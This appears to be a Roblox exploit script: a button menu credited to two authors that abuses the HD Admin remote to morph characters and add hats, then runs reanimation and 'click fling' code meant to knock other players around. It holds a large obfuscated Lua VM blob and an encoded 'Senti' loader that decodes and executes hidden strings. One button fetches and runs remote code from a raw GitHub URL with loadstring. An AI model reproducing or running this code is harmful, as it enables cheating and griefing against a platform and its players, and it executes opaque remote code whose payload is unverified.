a_lllIIlIllIlIllllIIlIIlll[#("xNg")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{812;263;10;867};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("b4")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("2G3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hi")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{662;253;171;857};{360;226;735;870};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("7vrK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eu")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("0KU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("F5")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("gTI")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qpl")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("s9fW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("SP")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{680;614;901;21};{695;664;234;679};{382;44;967;108};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("l2Bc")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Di")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("PU8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("OrJT")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OT")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uWQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("iBeu")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qL")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sde")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Qlzr")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Lz")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("mBS")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("5xf")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4l9T")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("yd0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5sMK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7X")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IIZ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("JSMR")];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("Kz4X3P58LsGostTVfboh1iOq6WR4RS2rGXU3ezdkX39oPilthnld5aZCVN0h7ar2BnTFK0RR7du8izMYKxWDGY")then ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Cef")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QC")]];else local ajefa_IlIIllIIIl;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("si")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Nux")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tEOI")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vO")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fPG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("29Sm")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7E")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{958;424;574;776};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Hq6k")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("iJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{919;29;202;404};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gLX5")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("HZf")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("x0")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("4Ck")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{45;517;813;749};{570;317;180;901};{601;693;940;987};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lE")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("3eC")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vP8J")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QZ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("7J0")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("AYyL")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jv")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("8mk")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{218;435;207;494};{496;803;936;743};}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7V")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("dIq")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5EWi")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("G7siBJ6nWLgYBAQUrHFg1Q1tvbbHKoZxM2nHqSqia0IybKkz4MF5aSE0g9WzHANIVUmJmjEKqxfbhErW0NN8T4v4")then if not ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bX")]]then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("0cH")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll>#("yAr61MLm9MryMlUi5PONCSNRaI3WPY1yrkZTlOAVEYh1ayoB2ZYpSq5PXK5sTYIlV3fBxb7qp3iOKWRMtC4Z9MQap")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("4u")];local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AXp")]];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1]=ajefa_IlIIIlIllIlIlllIlIlIllll;ajefa_lIlllIll[ajefa_lIIllIlIIlllII]=ajefa_IlIIIlIllIlIlllIlIlIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OvCE")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("f5")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oJK")];end;ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;end;end);end;return ajefa_lIIIllIlIIIIIllIlII(true,{},ajefa_lIlIllIlIlIlIIIlIllIllI())();end)(string.byte,table.insert,setmetatable);
end)

fescripts:addButton("Sword Glitchier",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "made by khlat and mkrm dacca ";
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me noob1")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4524991457")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4315489767")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4458601937")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4506945409")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4794315940")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4820152700")
wait(0.5)
loadstring(game:HttpGet('https://raw.githubusercontent.com/SwordSimIsGood/Sword-SG/main/Swords%20FE%20Starmd'))()
wait(0.5)
function Senti_IiiiIiIiIiiIiIIiIIiIi_(a,_)if a~=nil then if _>-2+(-41)+(2)+(72)+(95)+(-91)+(30)then print("you're usin fps unlock")end if Senti_IiiiIiIiIiiIiIIiIIiIie then print("you usin synapse.congratulations(I have no idea what to say)")end if("hello")=="x68x65x6Cx6Cx6F"then print("are you usin a bad exploit?")end return true elseif a==nil then return true else return end end Senti_IiiiIiIiIiiIiIIiIIiIie=Senti_IiiiIiIiIiiIiIIiIIiIie or nil Senti_IiiiIiIiIiiIiIIiIIiIid=Senti_IiiiIiIiIiiIiIIiIIiIid or Instance.new("Script") Senti_IiiiIiIiIiiIiIIiIIiIic=game:GetService("Workspace"):GetRealPhysicsFPS() Senti_IiiiIiIiIiiIiIIiIIiIib=game:GetService("Players")['LocalPlayer'] Senti_IiiiIiIiIiiIiIIiIIiIia=Senti_IiiiIiIiIiiIiIIiIIiIi_(Senti_IiiiIiIiIiiIiIIiIIiIib,Senti_IiiiIiIiIiiIiIIiIIiIic) if(not Senti_IiiiIiIiIiiIiIIiIIiIia)==true then return pcall(function()game:GetService("TestService"):Fail("Cannot load script")end)end return xpcall(function(a,b)local c=a local _=b a,b=nil,nil table.clear(c()) local _={} local b={} b.number=(65-(20/100)+.2) local d=getmetatable(newproxy(true)) local a=getmetatable(setmetatable({},{})) spawn(function()if c()then wait() d[2](d[3](d[4]))()else return"bitch"end end) local _=function(_)local d="" local a=function(_)return(_:gsub(".",function(_)if tonumber(_)then return _ else return""end end))end for _,c in next,string.split(_,"\a")do local _=tonumber(a(c)) if _~=nil then d=d..string.char(_-b.number)elseif c then d=d..c end end return d:sub(4)end a.index=_([['{\173;\176;\162;\165;\180;\181;\179;\170;\175;\168;}']]) d={} d[1-(20/100)+.2]=c() d[2-(20/100)+.2]=d[1][a.index] d[3-(20/100)+.2]=_ d[4-(20/100)+.2]=[['{\167;\176;\179;\97;\170;\109;\183;\97;\170;\175;\97;\175;\166;\185;\181;\109;\97;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\145;\173;\162;\186;\166;\179;\180;\99;\106;\111;\141;\176;\164;\162;\173;\145;\173;\162;\186;\166;\179;\111;\132;\169;\162;\179;\162;\164;\181;\166;\179;\123;\136;\166;\181;\133;\166;\180;\164;\166;\175;\165;\162;\175;\181;\180;\105;\106;\97;\165;\176;\78;\75;\170;\167;\97;\183;\123;\138;\180;\130;\105;\99;\131;\162;\180;\166;\145;\162;\179;\181;\99;\106;\97;\162;\175;\165;\97;\183;\111;\143;\162;\174;\166;\97;\191;\126;\99;\137;\182;\174;\162;\175;\176;\170;\165;\147;\176;\176;\181;\145;\162;\179;\181;\99;\97;\181;\169;\166;\175;\97;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\110;\115;\118;\111;\119;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\184;\162;\170;\181;\105;\111;\113;\114;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\113;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\166;\175;\165;\78;\75;\166;\175;\165;\78;\75;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\148;\181;\162;\179;\181;\166;\179;\136;\182;\170;\99;\106;\123;\148;\166;\181;\132;\176;\179;\166;\105;\99;\148;\166;\175;\165;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\109;\97;\188;\97;\78;\75;\149;\170;\181;\173;\166;\97;\126;\97;\99;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\124;\78;\75;\149;\166;\185;\181;\97;\126;\97;\99;\143;\166;\181;\173;\166;\180;\180;\97;\162;\164;\181;\170;\183;\162;\181;\166;\165;\157;\175;\132;\179;\166;\162;\181;\166;\165;\97;\163;\186;\97;\142;\170;\130;\170;\137;\180;\138;\180;\114;\115;\115;\119;\99;\124;\78;\75;\138;\164;\176;\175;\97;\126;\97;\99;\179;\163;\185;\181;\169;\182;\174;\163;\123;\112;\112;\181;\186;\177;\166;\126;\130;\180;\180;\166;\181;\103;\170;\165;\126;\118;\114;\113;\120;\114;\121;\115;\114;\114;\117;\103;\184;\126;\114;\118;\113;\103;\169;\126;\114;\118;\113;\99;\124;\78;\75;\133;\182;\179;\162;\181;\170;\176;\175;\97;\126;\97;\114;\119;\124;\190;\106;\78;\75;}']]end,function(_)game:GetService("TestService"):Fail("\n"..(script or Instance.new('Script')):GetFullName().." has occurred an error:".._)end,getfenv,setfenv)

end)

fescripts:addButton("Water Sword",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "made by khlat and mkrm dacca ";
    })
game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump")    
game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me Zeckie")
    wait(0.5)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Hat me 7100935371")
    wait(0.5)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Hat me 9061348537")
    wait(0.5)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Hat me 4886277931")
wait(2)
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

a=game.Players.LocalPlayer b=game.Players.LocalPlayer.Character c={}d=table.insert e=false for D,E in next,game:GetService("Players").LocalPlayer.Character:GetDescendants()do if E:IsA("BasePart")then d(c,game:GetService("RunService").Heartbeat:connect(function()pcall(function()E.Velocity=Vector3.new(-30,0,0)sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge)sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999)game.Players.LocalPlayer.ReplicationFocus=workspace end)end))end end function f(D,E,F)game.StarterGui:SetCore("SendNotification",{Title=D;Text=E;Duration=F or 5;})end local x=game:GetService("RunService")g=Instance.new('Folder',b)g.Name='CWExtra'b.Archivable=true local y=b:Clone()y.Name='NexoPD'for D,E in next,y:GetDescendants()do if E:IsA('BasePart')or E:IsA('Decal')then E.Transparency=1 end end h=5.65 a.Character=nil a.Character=b b.Humanoid.AutoRotate=false b.Humanoid.WalkSpeed=0 b.Humanoid.JumpPower=0 b.Torso.Anchored=true f('Nexo','Reanimating...\nPlease wait '..h..' seconds.')wait(h)b.Torso.Anchored=false f('Nexo','Reanimated..')b.Humanoid.Health=0 y.Animate.Disabled=true y.Parent=g y.HumanoidRootPart.CFrame=b.HumanoidRootPart.CFrame*CFrame.new(0,5,0)function i(D,E,F,G)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("AlignOrientation",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignOrientation.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]D.AlignOrientation.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D[D.Name].Orientation=G or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.AlignOrientation.Responsiveness=math.huge D.AlignPosition.RigidityEnabled=false D.AlignOrientation.MaxTorque=999999999 D.Massless=true end function j(D,E,F)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.Massless=true end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('Accessory')then i(E.Handle,y[E.Name].Handle)end end i(b['Head'],y['Head'])i(b['Torso'],y['Torso'])j(b['HumanoidRootPart'],y['Torso'],Vector3.new(0,0,0))i(b['Right Arm'],y['Right Arm'])i(b['Left Arm'],y['Left Arm'])i(b['Right Leg'],y['Right Leg'])i(b['Left Leg'],y['Left Leg'])k=a:GetMouse()local z=Instance.new("Part",g)z.CanCollide=false z.Transparency=1 d(c,x.RenderStepped:Connect(function()local D=workspace.CurrentCamera.CFrame.lookVector local E=y["HumanoidRootPart"]z.Position=E.Position z.CFrame=CFrame.new(z.Position,Vector3.new(D.X*10000,D.Y,D.Z*10000))end))l=false m=false n=false o=false p=false function q(D)r=Instance.new('BodyAngularVelocity',D)r.AngularVelocity=Vector3.new(9e9,9e9,9e9)r.MaxTorque=Vector3.new(9e9,9e9,9e9)end q(b.HumanoidRootPart)k=a:GetMouse()s=Instance.new('BodyPosition',b.HumanoidRootPart)s.P=9e9 s.D=9e9 s.MaxForce=Vector3.new(99999,99999,99999)local A d(c,x.Heartbeat:Connect(function()if A==true then s.Position=k.Hit.p b.HumanoidRootPart.Position=k.Hit.p else s.Position=y.Torso.Position b.HumanoidRootPart.Position=y.Torso.Position end end))local B=Instance.new("SelectionBox")B.Adornee=b.HumanoidRootPart B.LineThickness=0.02 B.Color3=Color3.fromRGB(250,0,0)B.Parent=b.HumanoidRootPart B.Name="RAINBOW"t=B if clickfling then d(c,k.Button1Down:Connect(function()A=true end))d(c,k.Button1Up:Connect(function()A=false end))end d(c,k.KeyDown:Connect(function(D)if D==' 'then p=true end if D=='w'then l=true end if D=='s'then m=true end if D=='a'then n=true end if D=='d'then o=true end end))d(c,k.KeyUp:Connect(function(D)if D==' 'then p=false end if D=='w'then l=false end if D=='s'then m=false end if D=='a'then n=false end if D=='d'then o=false end end))local function C(D,E,F)z.CFrame=z.CFrame*CFrame.new(-D,E,-F)y.Humanoid.WalkToPoint=z.Position end d(c,x.RenderStepped:Connect(function()if l==true then C(0,0,1e4)end if m==true then C(0,0,-1e4)end if n==true then C(1e4,0,0)end if o==true then C(-1e4,0,0)end if p==true then y.Humanoid.Jump=true end if l~=true and n~=true and m~=true and o~=true then y.Humanoid.WalkToPoint=y.HumanoidRootPart.Position end end))workspace.CurrentCamera.CameraSubject=y.Humanoid u=Instance.new('BindableEvent')d(c,u.Event:Connect(function()y:Destroy()e=true v=false for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then E.Anchored=true end end w=b.Humanoid:Clone()b.Humanoid:Destroy()w.Parent=b game.Players:Chat('-re')for D,E in pairs(c)do E:Disconnect()end game:GetService("StarterGui"):SetCore("ResetButtonCallback",true)u:Remove()end))game:GetService("StarterGui"):SetCore("ResetButtonCallback",u)

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = workspace.Camera.CameraSubject.Parent

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
